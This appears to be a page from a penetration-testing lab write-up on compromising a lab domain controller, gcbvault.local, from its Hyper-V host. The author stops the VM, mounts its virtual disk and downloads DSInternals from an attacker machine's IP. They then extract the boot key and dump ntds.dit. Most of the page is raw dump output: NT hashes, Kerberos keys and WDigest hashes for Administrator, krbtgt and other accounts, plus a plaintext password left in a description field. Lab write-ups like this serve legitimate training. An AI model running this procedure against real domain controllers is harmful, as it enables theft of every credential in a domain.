---
layout: default
---

## vault-dc.gcbvault.local

During vault-srv server enumeration It's possible to detect two diferent machines, vault-dc.gcbvault.local and vault-db.gcbvault.local



### 1. Local Hyper-V Virtual machines

```
PS C:\> Get-VM
Get-VM

Name     State   CPUUsage(%) MemoryAssigned(M) Uptime              Status             Version
----     -----   ----------- ----------------- ------              ------             -------
vault-db Running 0           1024              88.02:34:58.3000000 Operating normally 9.0
vault-dc Running 0           2048              88.02:34:57.4920000 Operating normally 9.0

```

### 2. Credentials and access procedure


Stop VM vault-dc:

```
Stop-VM vault-dc
```

Detect VM virtual Hard Disk:
```
PS C:\> ls 'C:\Users\Public\Documents\Hyper-V\Virtual hard disks\vault-dc.vhdx'
ls 'C:\Users\Public\Documents\Hyper-V\Virtual hard disks\vault-dc.vhdx'


    Directory: C:\Users\Public\Documents\Hyper-V\Virtual hard disks


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/26/2024   2:26 AM    14063501312 vault-dc.vhdx

```
Mount Virtual Hard-Disk in the filesystem
```
PS C:\> Mount-VHD 'C:\Users\Public\Documents\Hyper-V\Virtual hard disks\vault-dc.vhdx' -Verbose
Mount-VHD 'C:\Users\Public\Documents\Hyper-V\Virtual hard disks\vault-dc.vhdx' -Verbose
VERBOSE: Mount-VHD will mount the virtual hard disk "C:\Users\Public\Documents\Hyper-V\Virtual hard
disks\vault-dc.vhdx".
```
Download DSInternals binary from attacker machine and unzip the content:
```
PS C:\Users\Public> wget http://192.168.100.15:8530/DSInternals_v4.14.zip -OutFile DSInternals.zip
wget http://192.168.100.15:8530/DSInternals_v4.14.zip -OutFile DSInternals.zip
PS C:\Users\Public> Expand-Archive .\DSInternals.zip
Expand-Archive .\DSInternals.zip
```

Import Module and extract the BootKey from mounted Hard-Disk in filesystem Drive leter D:\ 

```
PS C:\Users\Public> Import-Module .\DSInternals\DSInternals\DSInternals.psd1
Import-Module .\DSInternals\DSInternals\DSInternals.psd1
PS C:\Users\Public> $key = Get-BootKey -SystemHivePath D:\Windows\System32\Config\SYSTEM
$key = Get-BootKey -SystemHivePath D:\Windows\System32\Config\SYSTEM
PS C:\Users\Public> $key
$key
a0fdaad1375e527e239183c77ad5133d
```

Extract users and credentails from vault-dc.gcbvault.local domain controller:
``` 
PS C:\Users\Public> Get-ADDBAccount -All -DBPath 'D:\Windows\NTDS\ntds.dit' -BootKey $key
Get-ADDBAccount -All -DBPath 'D:\Windows\NTDS\ntds.dit' -BootKey $key

DistinguishedName: CN=Administrator,CN=Users,DC=gcbvault,DC=local
Sid: S-1-5-21-1985505628-2019185050-2365871796-500
Guid: a7f7eeb7-2d4f-4219-9f76-43bbe09698b7
SamAccountName: Administrator
SamAccountType: User
UserPrincipalName: Administrator
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
SupportedEncryptionTypes: Default
AdminCount: True
Deleted: False
LastLogonDate: 2/15/2024 2:09:11 AM
DisplayName:
GivenName:
Surname:
Description: Built-in account for administering the computer/domain
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-1985505628-2019185050-2365871796-512
Secrets
  NTHash: b4a35aa3040a292a90ed8268c04caea8
  LMHash:
  NTHashHistory:
    Hash 01: b4a35aa3040a292a90ed8268c04caea8
    Hash 02: c87a64622a487061ab81e51cc711a34b
  LMHashHistory:
    Hash 01: d8935c6767afc0a83682e76fdf01b52d
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: a58ede131818605df2e7a0107f89259e
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: 1afbea08b9d3c43b
      OldCredentials:
        DES_CBC_MD5
          Key: f7b0ef37bf2cb08c
      Salt: GCBVAULT.LOCALAdministrator
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: a0fbc9e1c9b210bb7bb6777d821a03942a3d22c8b6e530574e94a9c799c87d8f
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 165de81b508086bfeca9ed4ca3d33f9e
          Iterations: 4096
        DES_CBC_MD5
          Key: 1afbea08b9d3c43b
          Iterations: 4096
      OldCredentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 2cd596f3f3f580d50bc63d21666165bac3117a2c52fe7a7a1600127978290eb7
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: c1e5f17546ed46213ca74083dbe9748a
          Iterations: 4096
        DES_CBC_MD5
          Key: f7b0ef37bf2cb08c
          Iterations: 4096
      OlderCredentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 508a8e46b674c8dae4658e0beeea54702d949f058eab25dd682012050a9daa36
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: cb338b6a0a644311ee2e0415a1b10c48
          Iterations: 4096
        DES_CBC_MD5
          Key: 343732b5e525f283
          Iterations: 4096
      ServiceCredentials:
      Salt: GCBVAULT.LOCALAdministrator
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
      Hash 01: 195367d45b7de7b801a0c11c4f042da7
      Hash 02: 4e1c23c47ff361bcce6442fea4650567
      Hash 03: 59728a8dc60f14dccf1db2200f67bed7
      Hash 04: 195367d45b7de7b801a0c11c4f042da7
      Hash 05: c18d20fd7797de26288edc2d9b9869d1
      Hash 06: 324acc2dda6cdf02f047bb8112c73980
      Hash 07: 61b7ab01b85c2b8a01b18c3fed827118
      Hash 08: a1d9ccaa6538146a52bbd08695138168
      Hash 09: f648f7a3a0fdf12aac447a738eda739b
      Hash 10: cc538ee5ef16d2a36418f60d1ea1b19f
      Hash 11: c1e81b7831ffa23dc68b4e68ef79d734
      Hash 12: a1d9ccaa6538146a52bbd08695138168
      Hash 13: 3cf205df58a4c7c3cfb6d79b9f84a57e
      Hash 14: 990a778d97e974cfa4e3c4135dfa8702
      Hash 15: f3d5c94c3e6acf9317741cd6976fa896
      Hash 16: 4c6bf787e347efda6548599f74b667de
      Hash 17: b8cb0be06d29e647eb7105102e21744f
      Hash 18: 3801677767ed9668c35cf20df978f866
      Hash 19: 55268fe5cd3aa6d86339a2699de71bfb
      Hash 20: 58862b9e65c697cf7bc098adbf7c9bc2
      Hash 21: 48a658a9223cf0f68c36ba69a81e2cfd
      Hash 22: 27d03d5b3586a050436411f097f3f291
      Hash 23: ed044010a2f0dd366d9a70cdf36a309b
      Hash 24: 1cdc92e629f123c199ec936674e03a5b
      Hash 25: d12ec868f5895bf128c23a311903a510
      Hash 26: 15ad54732ac270c45d3e6eadf12e4ca6
      Hash 27: d20cc49f8f2fb8856c477975d53f9ab1
      Hash 28: 6a40d3260b71e738cb56908dfe92e77c
      Hash 29: 84fd18b94207f57862f5545cc290def8
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:

DistinguishedName: CN=Guest,CN=Users,DC=gcbvault,DC=local
Sid: S-1-5-21-1985505628-2019185050-2365871796-501
Guid: 4912fe9e-908c-45d6-be57-1fbdb46ed572
SamAccountName: Guest
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 514
SidHistory:
Enabled: False
UserAccountControl: Disabled, PasswordNotRequired, NormalAccount, PasswordNeverExpires
SupportedEncryptionTypes:
AdminCount: False
Deleted: False
LastLogonDate:
DisplayName:
GivenName:
Surname:
Description: Built-in account for guest access to the computer/domain
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
SelfRelative
Owner: S-1-5-32-544
Secrets
  NTHash:
  LMHash:
  NTHashHistory:
  LMHashHistory:
  SupplementalCredentials:
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:

DistinguishedName: CN=krbtgt,CN=Users,DC=gcbvault,DC=local
Sid: S-1-5-21-1985505628-2019185050-2365871796-502
Guid: 587d5898-6f02-4c93-a29e-30ed3ca8313c
SamAccountName: krbtgt
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: False
UserAccountControl: Disabled, NormalAccount
SupportedEncryptionTypes: Default
AdminCount: True
Deleted: False
LastLogonDate:
DisplayName:
GivenName:
Surname:
Description: Key Distribution Center Service Account
ServicePrincipalName: {kadmin/changepw}
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-1985505628-2019185050-2365871796-512
Secrets
  NTHash: f85c4cfd00a3b76c07690470e8618b26
  LMHash:
  NTHashHistory:
    Hash 01: f85c4cfd00a3b76c07690470e8618b26
  LMHashHistory:
    Hash 01: d7ad69a34d3f1e649f74dc691200488a
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 515c2d07f7982cbd74995fbe0615d46d
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: cd19ba5ea24a3131
      OldCredentials:
      Salt: GCBVAULT.LOCALkrbtgt
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 759de1c27384e70a248181c8996fc327042082ec1b616fc42c8402e944a02d17
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 00dede2fac6aeffc9f0817c64a7417dd
          Iterations: 4096
        DES_CBC_MD5
          Key: cd19ba5ea24a3131
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: GCBVAULT.LOCALkrbtgt
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
      Hash 01: 14752cbb803005633157c706bbc07d42
      Hash 02: 2215f23f67437cc70400b56e777c89d6
      Hash 03: de89d85669562c232a676c4d9532f061
      Hash 04: 14752cbb803005633157c706bbc07d42
      Hash 05: 2215f23f67437cc70400b56e777c89d6
      Hash 06: af7d6e0897b8c6ad409b867d8a63bb6b
      Hash 07: 14752cbb803005633157c706bbc07d42
      Hash 08: 772d5c97b3af6e21cc8de33b49d2a4fb
      Hash 09: 772d5c97b3af6e21cc8de33b49d2a4fb
      Hash 10: 600eb5ca939deca2eaf445b0368bb6f5
      Hash 11: 4dfb596359920632259e10c90396ba4b
      Hash 12: 772d5c97b3af6e21cc8de33b49d2a4fb
      Hash 13: 8fa2f4ef303fe223ee886a56eedf7b4e
      Hash 14: 4dfb596359920632259e10c90396ba4b
      Hash 15: 7a7fcbd878c3f9f38382a399548f0e4c
      Hash 16: 7a7fcbd878c3f9f38382a399548f0e4c
      Hash 17: 875209be6405eb7087babc22e173959e
      Hash 18: af81339152d1b48db89b8befe133508f
      Hash 19: 6de2bcfefab7a33e66d97de939b074c5
      Hash 20: 69a58b2acb818ff6212eab428e1a4982
      Hash 21: 2a9d75cc869b4894867d2881a851d03c
      Hash 22: 2a9d75cc869b4894867d2881a851d03c
      Hash 23: d2437ed89e4cd3d1b2c21fe8bb7d1bac
      Hash 24: c22ace134903d220f754193d6d09748a
      Hash 25: c22ace134903d220f754193d6d09748a
      Hash 26: 813eb0658aa2b8284d09992b95273f7d
      Hash 27: 1494013175d917945ef7c7bcdf22e61c
      Hash 28: 7ce0cfdf1d756ae73edc1bf505ed78c4
      Hash 29: d730336126128951d8b0ad91a0402ead
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:

DistinguishedName: CN=vaultdb admin,CN=Users,DC=gcbvault,DC=local
Sid: S-1-5-21-1985505628-2019185050-2365871796-1104
Guid: dc123b86-f5c0-4b17-a1f4-c2c7478dd866
SamAccountName: vaultdbadmin
SamAccountType: User
UserPrincipalName: vaultdbadmin@gcbvault.local
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
SupportedEncryptionTypes:
AdminCount: False
Deleted: False
LastLogonDate: 2/15/2024 2:19:33 AM
DisplayName: vaultdb admin
GivenName: vaultdb
Surname: admin
Description: SafePass123
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
SelfRelative
Owner: S-1-5-21-1985505628-2019185050-2365871796-512
Secrets
  NTHash: 15a616907b5da18760411e20d1c04968
  LMHash:
  NTHashHistory:
    Hash 01: 15a616907b5da18760411e20d1c04968
  LMHashHistory:
    Hash 01: 7a021226d8cbc40f395781ea1857df60
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 3d540afad29de2b115f35fb2bcbaacd7
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: 8a6b3180f425efa8
      OldCredentials:
      Salt: GCBVAULT.LOCALvaultdbadmin
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 6851097053f4338248cc1da74e25d1984c7eedf3c772b8ffd5cdc12c531332e0
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 355b853a99b129a65f31957d49321d29
          Iterations: 4096
        DES_CBC_MD5
          Key: 8a6b3180f425efa8
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: GCBVAULT.LOCALvaultdbadmin
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
      Hash 01: 5a0791efcce652783d73e113d8fce22f
      Hash 02: 1ac4b7016472e7b4d3bf3e5effeec521
      Hash 03: c50ec0e58dd99f67d3e0a4d7e74b45d9
      Hash 04: 5a0791efcce652783d73e113d8fce22f
      Hash 05: 1ac4b7016472e7b4d3bf3e5effeec521
      Hash 06: 94aae8c568b759d3400e6b94ae3d9659
      Hash 07: 5a0791efcce652783d73e113d8fce22f
      Hash 08: aaf960c4d9bf6c1ebaa320e035fc0053
      Hash 09: aaf960c4d9bf6c1ebaa320e035fc0053
      Hash 10: b02342fe612786b762fca006bc388ae2
      Hash 11: 8ead18f0854f0015a52c178f588077b9
      Hash 12: aaf960c4d9bf6c1ebaa320e035fc0053
      Hash 13: 53e4d9ff263d41ae4806e6aceeb28098
      Hash 14: 8ead18f0854f0015a52c178f588077b9
      Hash 15: 601e47a26ba8d9ca9f0af46eadbbd124
      Hash 16: 601e47a26ba8d9ca9f0af46eadbbd124
      Hash 17: 0e78d77532e068a86d3b26e4dfa5e353
      Hash 18: 045f0c366a431a2b90501c6da6527dbf
      Hash 19: 7ad7589cb1c4e3b8967ed8fc05e6d5c1
      Hash 20: d2eaf6a9e1773a99cd1efa837c629982
      Hash 21: 49981e84db96b951fd3ffa749d875416
      Hash 22: 49981e84db96b951fd3ffa749d875416
      Hash 23: 6a71b6adc320ec847fcfd5d72624fa75
      Hash 24: 92b883950f427b3984674b1b87b50310
      Hash 25: 92b883950f427b3984674b1b87b50310
      Hash 26: 2b7b7f7610a4a4bb5fa73fee3321bb3f
      Hash 27: 22bd9a1dcc1b13886eb0cf8c4dc0607b
      Hash 28: f1880916a9fd9e8afe2ec415a43f2380
      Hash 29: 9471c7e1cb0a8ac3db43c9a565093302
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:

DistinguishedName: CN=VAULT-DC,OU=Domain Controllers,DC=gcbvault,DC=local
Sid: S-1-5-21-1985505628-2019185050-2365871796-1000
Guid: 53067b0b-42dc-41dc-934d-20d8a65efd39
SamAccountName: VAULT-DC$
SamAccountType: Computer
UserPrincipalName:
PrimaryGroupId: 516
SidHistory:
Enabled: True
UserAccountControl: ServerAccount, TrustedForDelegation
SupportedEncryptionTypes: RC4_HMAC, AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
AdminCount: False
Deleted: False
LastLogonDate: 7/26/2024 1:08:14 AM
DisplayName:
GivenName:
Surname:
Description:
ServicePrincipalName: {ldap/vault-dc.gcbvault.local/gcbvault.local, ldap/vault-dc.gcbvault.local, ldap/VAULT-DC,
ldap/vault-dc.gcbvault.local/VAULT...}
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
SelfRelative
Owner: S-1-5-21-1985505628-2019185050-2365871796-512
Secrets
  NTHash: 60b107d97ad2a1b618b48d5967c34236
  LMHash:
  NTHashHistory:
    Hash 01: 60b107d97ad2a1b618b48d5967c34236
    Hash 02: e829de103f6f92c4de3843cb12b894bc
    Hash 03: 12e795482da7aa67e3bf808fec8065aa
    Hash 04: 46acc69d365bf099cdc38658a0701306
    Hash 05: 37552e908e44d605435a70743b203876
    Hash 06: ee427dba4d8c7a5158f46e6531ba30fd
    Hash 07: c57f672b470f589afabd9ddbfc072a1b
    Hash 08: d87afbd309d211bf8b0c1e6d19a69ca0
    Hash 09: 1ed6086ebea0706533d28110d76e57cc
    Hash 10: 9b0ca91b7de558c10547a0e874164b5c
    Hash 11: 51b386875202b2ddb32a4b8a579d1b64
    Hash 12: ac4631bbbd1a52b55bf1d6e39df372ca
    Hash 13: 40aa93b64cb50405ad4bca5fee792cda
    Hash 14: b5b105c8eadb7e664d0165ec3f56ae43
    Hash 15: 5d716c7fa2903f350967ca076c0e584c
    Hash 16: e7cd60f37a3cbbde892d74d7a839cadd
    Hash 17: d072db5173ab4740778f88309ad2fe74
    Hash 18: fb5e33e8d487f27ef9d98fb0907e74f9
    Hash 19: 1eedf34fc72ba0758155e8903a36dfe8
    Hash 20: b95c69ff2d73fe7673ec7f4522c60287
    Hash 21: 415df8b0b64ac533b28127421e806f8b
  LMHashHistory:
    Hash 01: 21f30e3ac5c8ac98bc9491334ebb9229
    Hash 02: cd98cddea3ea9ebac9b30fa53f21455a
    Hash 03: cec7cf62db5c5c363c9da9acd7a1d2d4
    Hash 04: d79165a30eccac14359991d76288268a
    Hash 05: 542bbb00d472cd3c9ba0ba679cea98ad
    Hash 06: 0a658664128213c8bd9c903859752a4d
    Hash 07: 573ae4a9ce36b6acc265139bd647891b
    Hash 08: 6b362277e5fa2dc0036a4cef741c38fb
    Hash 09: 44ce5c5701a1eeaf8487879687772fb1
    Hash 10: 58af333e21978eaefd5cd7f70578c9c5
    Hash 11: d124392ae31a51c537e367d19c050f12
    Hash 12: a6d056293c78afd92cbcdf8219c2a72e
    Hash 13: c13fcb6b0174d495fe97c90d700bbc8b
    Hash 14: 8113b24157920b4384024d71dc092262
    Hash 15: 198b6a7cf364c1bd5114c4f093c81f88
    Hash 16: 67e89d3f0b666184112c2e4ba721b0c2
    Hash 17: 9bee842b17c20850de5f4e8c889e14cb
    Hash 18: a7fea4faef4dcaa188fcb5eef7eb8d10
    Hash 19: 2ed0d2840996762c3a8702b108610149
    Hash 20: 071cedd8871354efdf0dc5f894cefdb0
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash:
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: 40df1f7c0e61f175
      OldCredentials:
        DES_CBC_MD5
          Key: 3119d946434cb029
      Salt: GCBVAULT.LOCALhostvault-dc.gcbvault.local
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: a9b614a74d5839928c25c51218657369e6db4e2bf59ca66d1ce2819603f67113
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: a02f768938f7862dbd68bc2d6083cd13
          Iterations: 4096
        DES_CBC_MD5
          Key: 40df1f7c0e61f175
          Iterations: 4096
      OldCredentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 118f11f3c155972fb49e62ec1141c96e5d96e211b1f6b70a8a947661d1a94657
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: bd8fc9aedbbb0113b5c5acbc048ac021
          Iterations: 4096
        DES_CBC_MD5
          Key: 3119d946434cb029
          Iterations: 4096
      OlderCredentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 60027e37e15ae696c22ae006129422e2959fd9fcb600a3d15ee46c4538eff0f6
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 414cf37c9a7dbe059ac52982fcdc5e82
          Iterations: 4096
        DES_CBC_MD5
          Key: f79e341aadd516b5
          Iterations: 4096
      ServiceCredentials:
      Salt: GCBVAULT.LOCALhostvault-dc.gcbvault.local
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
      Hash 01: 17dbeeb93147de347f5fb46261d4739c
      Hash 02: 1636331f6032115016b02f673b0ed8d8
      Hash 03: 17dbeeb93147de347f5fb46261d4739c
      Hash 04: 17dbeeb93147de347f5fb46261d4739c
      Hash 05: 7754d6a04f0c2d520e4538f6d280fae8
      Hash 06: 7754d6a04f0c2d520e4538f6d280fae8
      Hash 07: 8252961aec393d07807ef32bf7ec4d7c
      Hash 08: 5d017e9b929ba4e7aa4ccd6d1ec571df
      Hash 09: d7c6d94c659396abe1d82b81e75fa12f
      Hash 10: 537f9ae944bd999d79c6f2fcb24e804d
      Hash 11: 537f9ae944bd999d79c6f2fcb24e804d
      Hash 12: 5d017e9b929ba4e7aa4ccd6d1ec571df
      Hash 13: 5d017e9b929ba4e7aa4ccd6d1ec571df
      Hash 14: 1127e37607217de14734daf8790e63d7
      Hash 15: f23c34e1c0f8a0c7f32b9a1d2243668f
      Hash 16: ebe34694b62768a14db49888186c7e0e
      Hash 17: 5f571c53fd1a5b3c36b7d3af3575fee9
      Hash 18: 59e95f45f26ac30a869ef78ab40161a6
      Hash 19: 488433d3f67028c16dfe0f5ac266decc
      Hash 20: 59e95f45f26ac30a869ef78ab40161a6
      Hash 21: 3e8aca28d10ce48001701d16ed5dc97b
      Hash 22: 124b2851c1ac9a41003d9acac3e81abd
      Hash 23: 3e8aca28d10ce48001701d16ed5dc97b
      Hash 24: c9fec9665f97e85ba5da4dfa42b3da7d
      Hash 25: 4da91c19df1337c24c54ce0c7097e605
      Hash 26: 095b069e47f6c49f789e8d4eaf6855f5
      Hash 27: e6c3000050ab18e5f36668299febdc95
      Hash 28: 8dc1ffe4ded31488fe78f8e313099cd6
      Hash 29: e6c3000050ab18e5f36668299febdc95
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:

DistinguishedName: CN=VAULT-DB,CN=Computers,DC=gcbvault,DC=local
Sid: S-1-5-21-1985505628-2019185050-2365871796-1103
Guid: 673168d5-42bf-4998-b1c3-bee33b9826cd
SamAccountName: VAULT-DB$
SamAccountType: Computer
UserPrincipalName:
PrimaryGroupId: 515
SidHistory:
Enabled: True
UserAccountControl: WorkstationAccount
SupportedEncryptionTypes: RC4_HMAC, AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
AdminCount: False
Deleted: False
LastLogonDate: 2/15/2024 2:19:22 AM
DisplayName:
GivenName:
Surname:
Description:
ServicePrincipalName: {HOST/vault-db.gcbvault.local, RestrictedKrbHost/vault-db.gcbvault.local, HOST/VAULT-DB,
RestrictedKrbHost/VAULT-DB...}
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
SelfRelative
Owner: S-1-5-21-1985505628-2019185050-2365871796-512
Secrets
  NTHash: 15f6de708b38121b7446d1bcb1b4e18b
  LMHash:
  NTHashHistory:
    Hash 01: 15f6de708b38121b7446d1bcb1b4e18b
    Hash 02: fe6eb769108a2ceabbfc01561401a613
    Hash 03: c7eeff27f3607120b84fa37768debe13
    Hash 04: 9b61c5b1b0e2a02c64865cd3b0ca32f6
    Hash 05: 0c08e4872261af521885c602afa7221b
    Hash 06: bf4847d6c39892c7e068f7d06a254048
    Hash 07: 1581ec783013a1b0c02244df12066a2d
    Hash 08: 7236c45713f63b301884b6f7732c7fcf
    Hash 09: a596a66f3cfc3b921562522309740191
    Hash 10: ef76454585d7d8eb43740fea143820be
    Hash 11: 9ae1a93e62b9c7590c9adcdc18aa8905
    Hash 12: c8fb3a43563918c62f2400ea00579cb7
    Hash 13: 43457a80609780f5c0c5743af52de41a
  LMHashHistory:
    Hash 01: 85a0665b52e077ca90f46305198912a6
    Hash 02: c975a8c43cfd6e17e0d7805a76c21859
    Hash 03: cc86ef6cbbe49d8e3a8f3bf713bd4236
    Hash 04: ecba995f5cf1d58943e122a5db671449
    Hash 05: c49c48ebeb37998b2d02eaba6eeff726
    Hash 06: 0df9e1979bcc36f2f17c02b6f53a54ec
    Hash 07: efa3985584a5d0881fe36abeea85107c
    Hash 08: 69b7f0daba85d9ec2f8db0c2fa563488
    Hash 09: 17510d32052dd8d5df927b795b610a06
    Hash 10: 0e7c05a40af215c6f71ba8d8ef6f8a25
    Hash 11: 89d6f5fc3e4efc13d80b28f85fec43b2
    Hash 12: ef358412f92173832788e7ca6253b388
    Hash 13: 71f4acc8faec1bd6f6efee6ae48be09b
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash:
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: 8c734a9bc443466d
      OldCredentials:
        DES_CBC_MD5
          Key: 08f15e5192c44a1a
      Salt: GCBVAULT.LOCALhostvault-db.gcbvault.local
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 1f3f406a1e5b800409e2779a754193004e07265cad3820cf3c33176047bfd31b
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 3fac3919dbd714c2a7a5d32f010d8796
          Iterations: 4096
        DES_CBC_MD5
          Key: 8c734a9bc443466d
          Iterations: 4096
      OldCredentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 90446884ac7553538095519b4f3bf47b778b63c83ae67c3f74575406e58275c4
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: d47c0c1a9bfca8a14d4e9400ff827136
          Iterations: 4096
        DES_CBC_MD5
          Key: 08f15e5192c44a1a
          Iterations: 4096
      OlderCredentials:
        AES256_CTS_HMAC_SHA1_96
          Key: c9672a5ffcf60f4ae59edad724fcb3ee849856f6a3804fa9825675a1dba798a6
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 99219516931bf3f6ee7c29a3313ee212
          Iterations: 4096
        DES_CBC_MD5
          Key: 2a8c6ecbc294adcd
          Iterations: 4096
      ServiceCredentials:
      Salt: GCBVAULT.LOCALhostvault-db.gcbvault.local
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
      Hash 01: 72bacc5985a5c6c11ac89409b4a10bbc
      Hash 02: a146692a957a1009d15ea86794dd6843
      Hash 03: 72bacc5985a5c6c11ac89409b4a10bbc
      Hash 04: 72bacc5985a5c6c11ac89409b4a10bbc
      Hash 05: fe180181f6371f79bbd1a9ce068432cd
      Hash 06: fe180181f6371f79bbd1a9ce068432cd
      Hash 07: 611401c9b2ed32e5717928fecb08e6d6
      Hash 08: a30bd2ae36060cd91c615a5a37631375
      Hash 09: 1c088d0a0c7de583e9bbc72c44817045
      Hash 10: 034da8f13213c4c28050aa64222cf2c1
      Hash 11: 034da8f13213c4c28050aa64222cf2c1
      Hash 12: a30bd2ae36060cd91c615a5a37631375
      Hash 13: a30bd2ae36060cd91c615a5a37631375
      Hash 14: e42f6254c3502a513f6a4a41a578784c
      Hash 15: de70c735fe10192428f0a44b912f1695
      Hash 16: 4eaa7d5f9e9c433464205cd3aed2ab75
      Hash 17: 99e0de55ac2144675d07d5f5f8052459
      Hash 18: e47af67c0126df950a4db8b0baef3dda
      Hash 19: d7b0b30d519537cd42138a078f528861
      Hash 20: e47af67c0126df950a4db8b0baef3dda
      Hash 21: 4b0f0885552f1b67b17feb89b3802fd9
      Hash 22: 2c3144dae04a451331bc021851e777da
      Hash 23: 4b0f0885552f1b67b17feb89b3802fd9
      Hash 24: 5238f9b59698841c89cebf7dd85827ac
      Hash 25: 3747d7dbc6b932d29c4d693faa3ade13
      Hash 26: 67f3d61f4a880c25161647655cf8dc6d
      Hash 27: f46339bf67ef230cc3e9637a66de5279
      Hash 28: 4b1b7604e1170e416e16d5dc1d48a0fc
      Hash 29: f46339bf67ef230cc3e9637a66de5279
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:
```
Dismount the Virtual Hard DIsk from the FileSystem and launch the VM again:
```
PS C:\Users\Public> DisMount-VHD 'C:\Users\Public\Documents\Hyper-V\Virtual hard disks\vault-dc.vhdx' -Verbose
DisMount-VHD 'C:\Users\Public\Documents\Hyper-V\Virtual hard disks\vault-dc.vhdx' -Verbose
VERBOSE: Dismount-VHD will dismount the virtual hard disk "C:\Users\Public\Documents\Hyper-V\Virtual hard
disks\vault-dc.vhdx".
PS C:\Users\Public> Start-VM vault-dc
Start-VM vault-dc
```




[back](./section8.html)
